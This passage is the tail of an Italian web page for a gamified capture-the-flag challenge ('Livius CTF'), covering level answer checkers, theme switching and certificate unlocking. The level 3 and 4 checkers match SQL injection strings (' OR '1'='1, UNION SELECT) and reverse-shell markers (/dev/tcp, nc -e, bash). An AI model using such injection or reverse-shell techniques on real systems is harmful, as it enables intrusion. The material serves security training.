+            if (answer.includes("' OR '1'='1") || answer.includes("' OR 1=1") || answer.includes("UNION SELECT") || answer.toLowerCase().includes("or '1'='1")) {
+                resultDiv.innerHTML = '<p class="success-message">SQL Injection riuscita! Dati estratti con successo. Livello completato.</p>';
+                unlockLevel(3);
+            } else {
+                resultDiv.innerHTML = '<p class="error-message">SQL Injection fallita.</p>';
+            }
+        }
+        
+        function checkLevel4() {
+            const answer = document.getElementById('level4-answer').value;
+            const resultDiv = document.getElementById('level4-result');
+            
+            if (answer.includes("bash") || answer.includes("/dev/tcp") || (answer.includes("nc") && answer.includes("-e")) || answer.toLowerCase().includes("reverse") || answer.toLowerCase().includes("shell")) {
+                resultDiv.innerHTML = '<p class="success-message">Reverse Shell stabilita! Controllo remoto ottenuto. Livello completato.</p>';
+                unlockLevel(4);
+            } else {
+                resultDiv.innerHTML = '<p class="error-message">Reverse Shell non riuscita.</p>';
+            }
+        }
+        
+        function checkLevel5() {
+            const answer = document.getElementById('level5-answer').value;
+            const resultDiv = document.getElementById('level5-result');
+            
+            if (answer === getCorrectAnswer('level5')) {
+                resultDiv.innerHTML = '<p class="success-message">Exploit eseguito con successo! Privilegi di root ottenuti. Livello completato.</p>';
+                unlockLevel(5);
+            } else {
+                resultDiv.innerHTML = '<p class="error-message">Exploit fallito.</p>';
+            }
+        }
+        
+        function checkLevel6() {
+            const answer = document.getElementById('level6-answer').value;
+            const resultDiv = document.getElementById('level6-result');
+            
+            if (answer === getCorrectAnswer('level6')) {
+                resultDiv.innerHTML = '<p class="success-message">Flag finale trovato! Livius CTF completata con successo.</p>';
+                unlockLevel(6);
+            } else {
+                resultDiv.innerHTML = '<p class="error-message">Flag errato.</p>';
+            }
+        }
+        
+        function unlockLevel(level) {
+            completedLevels = Math.max(completedLevels, level);
+            
+            if (level < 6) {
+                document.querySelector(`.folder[data-window="level${level+1}"]`).classList.remove('locked');
+                document.querySelector(`.menu-item[data-window="level${level+1}"]`).classList.remove('locked');
+                
+                showNotification('Livello Sbloccato', `Complimenti! Hai sbloccato il Livello ${level+1}.`, 3000);
+            } else if (level === 6) {
+                const certificateFolder = document.querySelector('.folder[data-window="certificate"]');
+                const certificateMenuItem = document.querySelector('.menu-item[data-window="certificate"]');
+                
+                certificateFolder.classList.remove('locked');
+                certificateMenuItem.classList.remove('locked');
+                
+                document.querySelector('.certificate-preview-container').classList.add('certificate-unlocked');
+                
+                updateCertificatePreview();
+                
+                showNotification(
+                    'Challenge Completata!', 
+                    'Complimenti! Hai completato tutti i livelli. Ora puoi personalizzare e scaricare il tuo certificato.', 
+                    5000
+                );
+            }
+        }
+        
+        function changeTheme(e) {
+            const themeOption = e.currentTarget;
+            const theme = themeOption.getAttribute('data-theme');
+            const bg = themeOption.getAttribute('data-bg');
+            
+            document.querySelectorAll('.theme-option').forEach(opt => {
+                opt.classList.remove('active');
+            });
+            
+            themeOption.classList.add('active');
+            
+            if (theme) {
+                currentTheme = theme;
+                applyTheme();
+            }
+            
+            if (bg) {
+                currentBg = bg;
+                applyBackground();
+            }
+            
+            showNotification('Tema Cambiato', 'Il tema del desktop è stato aggiornato.', 2000);
+        }
+        
+        function applyTheme() {
+            const root = document.documentElement;
+            
+            switch(currentTheme) {
+                case 'default':
+                    root.style.setProperty('--primary', '#1a1a2e');
+                    root.style.setProperty('--secondary', '#16213e');
+                    root.style.setProperty('--accent', '#0f3460');
+                    root.style.setProperty('--highlight', '#e94560');
+                    break;
+                case 'dark-blue':
+                    root.style.setProperty('--primary', '#2c3e50');
+                    root.style.setProperty('--secondary', '#34495e');
+                    root.style.setProperty('--accent', '#2980b9');
+                    root.style.setProperty('--highlight', '#e74c3c');
+                    break;
+                case 'green':
+                    root.style.setProperty('--primary', '#16a085');
+                    root.style.setProperty('--secondary', '#1abc9c');
+                    root.style.setProperty('--accent', '#27ae60');
+                    root.style.setProperty('--highlight', '#e67e22');
+                    break;
+                case 'blue':
+                    root.style.setProperty('--primary', '#2980b9');
+                    root.style.setProperty('--secondary', '#3498db');
+                    root.style.setProperty('--accent', '#1f618d');
+                    root.style.setProperty('--highlight', '#e74c3c');
+                    break;
+                case 'purple':
+                    root.style.setProperty('--primary', '#8e44ad');
+                    root.style.setProperty('--secondary', '#9b59b6');
+                    root.style.setProperty('--accent', '#6c3483');
+                    root.style.setProperty('--highlight', '#e74c3c');
+                    break;
+                case 'red':
+                    root.style.setProperty('--primary', '#c0392b');
+                    root.style.setProperty('--secondary', '#e74c3c');
+                    root.style.setProperty('--accent', '#922b21');
+                    root.style.setProperty('--highlight', '#f39c12');
+                    break;
+            }
+        }
+        
+        function applyBackground() {
+            const body = document.body;
+            
+            switch(currentBg) {
+                case '1':
+                    body.style.setProperty('--bg-image', 'url(\'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a1a2e"/><path d="M0 0L100 100" stroke="%230f3460" stroke-width="1"/><path d="M100 0L0 100" stroke="%230f3460" stroke-width="1"/></svg>\')');
+                    break;
+                case '2':
+                    body.style.setProperty('--bg-image', 'url(\'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%232c3e50"/><circle cx="50" cy="50" r="30" fill="%2334495e" opacity="0.5"/></svg>\')');
+                    break;
+                case '3':
+                    body.style.setProperty('--bg-image', 'url(\'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%2316a085"/><polygon points="50,10 90,90 10,90" fill="%231abc9c" opacity="0.5"/></svg>\')');
+                    break;
+                case '4':
+                    body.style.setProperty('--bg-image', 'url(\'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%232980b9"/><rect x="20" y="20" width="60" height="60" fill="%233498db" opacity="0.5"/></svg>\')');
+                    break;
+            }
+        }
+        
+        function applyCertificateCustomization() {
+            updateCertificatePreview();
+            showNotification('Personalizzazione Applicata', 'La personalizzazione del certificato è stata applicata con successo!', 3000);
+        }
+        
+        function previewCertificate() {
+            updateCertificatePreview();
+            openWindowById('certificate');
+        }
+        
+        function showHelp() {
+            const helpContent = "Benvenuto nella Livius CTF!\n\n" +
+                "Questa è una challenge di sicurezza informatica con 6 livelli di difficoltà crescente.\n\n" +
+                "Completa tutti i livelli per ottenere il certificato finale.\n\n" +
+                "Usa il menu Start per accedere alle varie funzionalità.\n\n" +
+                "Ogni livello include suggerimenti e soluzioni se hai difficoltà.\n\n" +
+                "Buona fortuna!";
+            
+            showNotification('Guida Livius CTF', helpContent, 8000);
+        }
+    </script>
+</body>
+</html>
